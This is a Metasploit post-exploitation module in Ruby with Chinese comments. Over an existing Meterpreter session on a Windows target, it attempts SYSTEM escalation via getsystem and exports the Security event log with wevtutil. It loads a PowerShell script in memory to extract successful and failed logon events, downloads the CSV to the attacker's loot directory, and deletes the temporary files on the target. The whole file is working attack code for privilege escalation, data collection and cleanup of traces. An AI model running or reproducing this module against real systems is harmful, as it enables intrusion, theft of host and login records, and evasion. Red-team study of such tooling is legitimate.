##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Post
  include Msf::Post::Windows::Priv
  include Msf::Post::Windows::Powershell

  def initialize(info = {})
    super(update_info(info,
      'Name'          => 'Security Log host extract',
      'Description'   => %q(
        This module PowerShell is used to analyze successful and failed login events in the security log,
      And extract relevant information.
      ),
      'License'       => MSF_LICENSE,
      'Author'        => 'AnonySec',
      'Platform'       => 'win',
      'Arch'          => [ ARCH_X86, ARCH_X64 ],
      'SessionTypes'  => [ 'meterpreter' ]
      ))

      register_options(
        [
          OptBool.new('GETSYSTEM', [true, 'Attempt to get SYSTEM privilege on the target host.', false])
        ]
      )
  end

  # 尝试提权
  def getsystem
    results = session.priv.getsystem
    if results[0]
      return true
    else
      return false
    end
  end

  # 载入EventLog.ps1,内存加载,参考 post/windows/gather/outlook.rb
  def execute_eventlog_script(command)
    print_good("Start Execute EventLog Script ...")
    # /data/post/powershell/EventLog.ps1
    psh_script = File.read(File.join(Msf::Config.data_directory, "post", "powershell", "EventLog.ps1"))
    # 压缩脚本
    compressed_script = compress_script(psh_script) + command
    # print_status("#{compressed_script}")
    cmd_out, runnings_pids, open_channels = execute_script(compressed_script)
  
    while(log = cmd_out.channel.read)
      # print ("#{log}")
    end
  end

  def run
    # Checks the Windows Version.
    wver = sysinfo["OS"]
    print_status("Target OS: #{wver}")
    # Checks privileges of the session, and tries to get SYSTEM privileges if needed.
    print_status("Checking for SYSTEM privileges on session")
    if !is_system?
      if datastore['GETSYSTEM']
        print_status("Trying to get SYSTEM privileges")
        if getsystem
          print_good("Get SYSTEM privileges")
        else
          print_error("Could not obtain SYSTEM privileges")
          return
        end
      else
        print_error("Session is not running with SYSTEM privileges. Try setting GETSYSTEM ")
        return
      end
    else
      print_good("Session is already running with SYSTEM privileges")
    end

    # /lib/msf/core/auxiliary/report.rb -> def store_loot
    # 实际目录 /.msf4/loot/
    dir = Msf::Config.loot_directory
    # 随机 字母数字8位
    sec = Rex::Text.rand_text_alphanumeric(8)
    # print_good("#{sec}")

    # lib/msf/core/post/windows/process.rb
    # Msf::Post::Windows::Process

    # lib/rex/post/meterpreter/extensions/stdapi/sys/process.rb
    # wevtutil.exe管理员权限运行
    session.sys.process.execute("wevtutil.exe epl Security C:\\Windows\\Temp\\#{sec}.evtx")

    # 日志文件大,下载载间较长
    # session.fs.file.download_file("#{dir}/#{rhost}-Security.evtx","C:\\Windows\\Temp\\Security.evtx")

    command = "C:\\Windows\\Temp\\" + "#{sec}.evtx"
    # print_good("#{command}")
    execute_eventlog_script(command)

    print_status("Download Security.csv ...")

    # download下载远程文件到本地, download_file下载远程单文件到本地
    # session.fs.file.download_file(local, remote)
    # session.fs.file.upload_file(remote, local)
    
    # session 与 clinet 区别 ？
    # client.fs.file.download_file("#{dir}/#{rhost}-Security.csv","C:\\Windows\\Temp\\#{sec}.evtx")

    # lib/rex/post/meterpreter/extensions/stdapi/fs/file.rb
    session.fs.file.download_file("#{dir}/#{rhost}-Security.csv","C:\\Windows\\Temp\\#{sec}.csv")

    print_good("OutFile: #{dir}/#{rhost}-Security.csv")
    
    # 删除目标机遗留文件
    session.fs.file.rm("C:\\Windows\\Temp\\#{sec}.evtx")
    session.fs.file.rm("C:\\Windows\\Temp\\#{sec}.csv")
  end
end